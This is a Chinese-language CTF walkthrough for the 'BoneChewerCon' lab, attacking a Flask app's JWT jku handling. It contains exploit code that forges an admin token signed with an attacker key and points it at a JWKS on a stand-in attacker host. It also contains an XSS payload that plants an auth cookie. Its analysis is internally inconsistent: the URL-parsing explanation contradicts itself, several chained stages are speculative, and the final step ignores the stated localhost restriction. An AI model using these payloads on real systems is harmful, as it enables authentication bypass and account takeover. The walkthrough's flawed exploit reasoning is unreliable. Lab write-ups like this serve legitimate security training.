# BoneChewerCon 靶场通关流程

## 信息收集

### 背景信息
- 项目代码类型：Python Flask Web Application
- 部署工具：uWSGI + Nginx
- 认证机制：JWT (RS256 RSA签名)
- 前端框架：原生 JavaScript + Fetch API

### 配置信息
- 数据库：SQLite3
- JWT配置：使用 RS256 算法，由 Crypto.PublicKey 生成 RSA 2048位密钥
- Bot机制：Selenium + Chrome 驱动，以admin身份访问 `/list` 接口
- 目标位置：`schema.sql` 中 presentations 表包含 flag：`HTB{f4k3_fl4g_f0r_t3st1ng!}`

### 路由信息
| 路由 | 方法 | 认证 | 权限检查 | 说明 |
|------|------|------|---------|------|
| `/` | GET/POST | 可选(cookie auth) | 无 | 首页，用户可提交presentation idea |
| `/list` | GET | 必须 | admin + 127.0.0.1 IP | 展示所有presentation列表 |
| `/api/list` | GET | 必须 | admin + 127.0.0.1 IP | JSON格式返回presentation数据 |
| `/api/bot/login` | GET | IP检查 | 127.0.0.1 IP | Bot登录端点，创建admin token并设置cookie |
| `/api/csp-report` | POST | 无 | 无 | CSP违规报告，接收blocked-uri/violated-directive/token |
| `/.well-known/jwks.json` | GET | 无 | 无 | 公开RSA公钥端点 |

### 接口信息

#### 认证相关
- **session.create()**: 创建JWT token，包含username/token/iat/exp，使用私钥RS256签名
- **session.decode()**: 解析JWT，从jku头获取公钥URL并验证签名
- **session.fetch_jku()**: 从指定URL获取jwks.json，进行多层校验：
  - 必须为 http:// 或 https://
  - 不允许使用用户名(@ 符号)
  - 端口限制为 80/8080/5000
  - 域名必须为 `AUTH_PROVIDER` 配置值（localhost）
  - 响应必须是 application/json

#### 业务相关
- **submissions.new()**: 向 presentations 表插入用户提交的idea
- **submissions.getall()**: 查询 presentations 表所有记录
- **submissions.report()**: 记录CSP报告到 reports 表
- **check_if_authenticated()**: 装饰器，处理cookie auth，自动创建guest用户或验证admin

## 情报分析和威胁建模

### 关键安全设计

1. **JWT安全性**：
   - 使用RS256非对称签名（较安全）
   - JWT头包含 `jku` 和 `kid` 字段
   - 服务器从jku动态获取公钥进行验证

2. **访问控制**：
   - `/list` 和 `/api/list` 限制admin用户且必须本地IP(127.0.0.1)
   - Bot机器人会定时访问 `/list`，具有admin权限
   - `/` 允许任意用户访问，idea内容会被存储并在admin面板展示

3. **数据流向**：
   - 用户提交idea → 存储在presentations表
   - Bot访问 `/list` → 前端动态加载 `/api/list` JSON
   - 前端JavaScript使用 `innerHTML +=` 直接拼接DOM（**XSS漏洞**）

### 识别的漏洞

1. **JKU Claims Misuse - JWT头注入**（**CRITICAL**）
   - 位置：`models.py` 中的 `session.decode()` 和 `session.fetch_jku()` 函数
   - 问题：应用信任JWT头中的 `jku` 字段，允许攻击者指定任意的JWKS端点
   - 缺陷分析：
     ```python
     @staticmethod
     def decode(jwt_token):
         jku = jwt.get_unverified_header(jwt_token).get('jku', '')  # 直接从未验证的JWT头读取
         # 然后用此jku去获取公钥
         sess = jwt.decode(jwt_token, key=session.get_jwk(jku, kid), algorithms=['RS256'])
     ```
   - 这是经典的JKU验证缺陷：应用在验证JWT签名**之前**就使用了JWT头中的jku值

2. **URL Parsing Inconsistencies - URL解析不一致**（**CRITICAL**）
   - 位置：`models.py` 中的 `session.fetch_jku()` 函数的URL验证
   - 问题：正则表达式和字符串操作的解析结果不一致
   - 验证缺陷分析：
     ```python
     SCHEME_RE = re.compile(r'^([' + scheme_chars + ']+:)?//')
     
     def fetch_jku(url):
         domain = SCHEME_RE.sub('', url).partition('/')[0]  # 使用正则移除scheme
         scheme = re.match(SCHEME_RE, url)
         
         if '@' in url:
             domain = domain.split('@')[1]  # 处理userinfo
         
         if ':' in domain:
             domain, port = domain.split(':')  # 分割域名和端口
     ```
   - 漏洞：不同的URL库和自定义解析方式可能产生不同结果
     - 例如：`http://localhost:80@attacker.com/` 
     - 正则解析可能得到不同的domain值
   - 攻击者可以通过精心构造URL来绕过域名白名单检查

3. **Response Splitting Vulnerability - HTTP响应分割**（**HIGH**）
   - 位置：`session.fetch_jku()` 进行 `requests.get(url)` 时
   - 问题：如果URL中包含 `\r\n`，可能导致HTTP响应分割
   - 漏洞形式：
     ```
     url = "http://localhost/path\r\nX-Custom-Header: evil"
     ```
   - 影响：可能注入HTTP头或分割响应

4. **Session Fixation - 会话固定**（**HIGH**）
   - 位置：`check_if_authenticated()` 装饰器中
   - 问题：应用允许攻击者指定任意的JWT token（通过伪造），且不验证token的来源
   - 缺陷：
     ```python
     g.session = session.decode(request.cookies.get('auth'))
     # 只要JWT签名有效就接受，不管是谁签发的
     ```
   - 攻击方式：
     1. 攻击者伪造admin JWT token
     2. 强制用户使用此token（通过Set-Cookie或其他方式）
     3. 用户随后使用此token访问应用

5. **CSP Policy Injection - CSP策略注入**（**HIGH**）
   - 位置：`util.py` 中的 `csp()` 装饰器和 `/api/csp-report` 端点
   - 问题：CSP report_uri 包含用户token，且 `/api/csp-report` 接收并存储report数据
   - 缺陷分析：
     ```python
     REPORT_URI = f"/api/csp-report?token={g.session.get('token')}"
     # token可能包含特殊字符，导致CSP注入
     
     @api.route('/api/csp-report', methods=['POST'])
     def csp_report():
         report = json.loads(request.get_data()).get('csp-report')
         submissions.report(report.get('blocked-uri'), ...)
         # blocked-uri 被直接存储，可能包含恶意内容
     ```
   - 攻击方式：
     1. 通过URL parsing绕过获取admin权限
     2. 修改CSP report中的 blocked-uri 注入恶意内容
     3. 当其他用户访问报告时触发攻击

## 攻击链

### 攻击目标
获取 `presentations` 表中的admin用户提交的flag内容

### 核心攻击路径：JKU Claims Misuse → URL Parsing绕过 → Response Splitting → Session Fixation → CSP Injection

#### 第一阶段：JKU Claims Misuse - 识别JWT信任缺陷

Flask应用的JWT验证流程存在关键缺陷：
```python
def decode(jwt_token):
    # ❌ 问题：直接从未验证的JWT头读取jku
    jku = jwt.get_unverified_header(jwt_token).get('jku', '')
    kid = jwt.get_unverified_header(jwt_token).get('kid', '')
    
    # 然后用此jku去获取公钥进行验证
    # 这形成了一个循环：需要公钥来验证JWT，但公钥的位置由JWT头指定
    sess = jwt.decode(jwt_token, key=session.get_jwk(jku, kid), algorithms=['RS256'])
```

**JKU Claims Misuse漏洞**：
- 攻击者可以在JWT头中指定任意的 `jku` 值
- 应用会去那个URL获取公钥
- 应用用获取到的公钥验证JWT签名
- 如果攻击者也控制了该URL，可以返回自己的公钥，使用对应私钥签署token

#### 第二阶段：URL Parsing Inconsistencies - 绕过域名白名单

应用对jku URL的验证包含多个检查：
```python
def fetch_jku(url):
    # 检查1：提取域名
    domain = SCHEME_RE.sub('', url).partition('/')[0]  # 正则移除scheme
    
    # 检查2：移除userinfo
    if '@' in url:
        domain = domain.split('@')[1]  
    
    # 检查3：分割端口
    if ':' in domain:
        domain, port = domain.split(':')
    
    # 检查4：验证域名
    if not domain == current_app.config.get('AUTH_PROVIDER'):  # 必须是localhost
        return abort(400, 'Invalid provider')
```

**URL Parsing Inconsistencies漏洞**：

不同的URL处理库对同一个URL的解析结果可能不同。例如：

```
URL: http://localhost:80@attacker.com/.well-known/jwks.json

应用的自定义解析：
  SCHEME_RE.sub('', url) → "localhost:80@attacker.com/.well-known/jwks.json"
  partition('/')[0] → "localhost:80@attacker.com"
  if '@' in url → split('@')[1] → "attacker.com"  ❌ 提取错误

但requests库的解析：
  requests会识别"localhost:80"为credential，"attacker.com"为真实host
  实际请求会发送到attacker.com而不是localhost
```

**攻击方式**：
1. 构造形如 `http://localhost:80@attacker.com/.well-known/jwks.json` 的URL
2. 应用的检查看到 "localhost"，认为有效
3. requests库实际连接到 `attacker.com`
4. 获取攻击者的恶意JWKS

#### 第三阶段：Response Splitting - 注入HTTP头

利用URL中的特殊字符进行HTTP响应分割：

```python
# 在jku中注入CRLF字符
jku = "http://localhost/.well-known/jwks.json\r\nX-Injected: header"

# requests库可能允许这样的URL，导致：
GET /.well-known/jwks.json HTTP/1.1
Host: localhost
X-Injected: header  # ← 注入的自定义头
```

**结合的攻击**：
- 通过精心构造URL，注入HTTP头
- 可能修改 Content-Type、Set-Cookie等
- 导致JWKS响应被错误解析或注入恶意内容

#### 第四阶段：Session Fixation - 强制特定会话

一旦获得伪造的admin JWT token，攻击者可以：

1. **方式A：直接访问**
   ```python
   # 攻击者伪造包含admin身份的JWT
   fake_admin_token = jwt.encode({
       'username': 'admin',
       'token': 'fake_token'
   }, attacker_key, headers={'jku': attacker_jwks_url, 'kid': 'attacker'})
   
   # 直接在本地访问
   response = requests.get(
       'http://localhost/api/list',
       cookies={'auth': fake_admin_token}
   )
   ```

2. **方式B：通过XSS进行Session Fixation**
   ```javascript
   // 注入恶意idea
   <img src=x onerror="
   document.cookie = 'auth=' + attacker_token;
   location.reload();
   ">
   ```

#### 第五阶段：CSP Policy Injection - 利用CSP报告机制

一旦获得admin权限，可以利用CSP报告进行进一步攻击：

```python
# CSP头中包含token参数
REPORT_URI = f"/api/csp-report?token={g.session.get('token')}"

# 攻击者可以：
# 1. 访问/list页面
# 2. 修改report数据，注入恶意内容
# 3. 通过blocked-uri字段注入SQL或脚本
```

### 完整利用流程

**步骤1：构造恶意URL**
```
http://localhost:80@attacker.com/.well-known/jwks.json
```

**步骤2：生成伪造token**
```python
import jwt
from Crypto.PublicKey import RSA

# 攻击者生成自己的密钥
key = RSA.generate(2048)

fake_token = jwt.encode(
    {'username': 'admin', 'token': 'attacker_token'},
    key.export_key(),
    algorithm='RS256',
    headers={
        'jku': 'http://localhost:80@attacker.com/.well-known/jwks.json',
        'kid': 'attacker_kid'
    }
)
```

**步骤3：在攻击服务器提供恶意JWKS**
```json
{
  "keys": [{
    "alg": "RS256",
    "kty": "RSA",
    "n": "attacker_public_key_n",
    "e": "attacker_public_key_e",
    "kid": "attacker_kid"
  }]
}
```

**步骤4：访问admin端点**
```python
response = requests.get(
    'http://target:80/api/list',
    cookies={'auth': fake_token}
)

# 获取flag
data = response.json()
for item in data['submissions']:
    if item['user'] == 'admin':
        print(item['idea'])  # 获得flag
```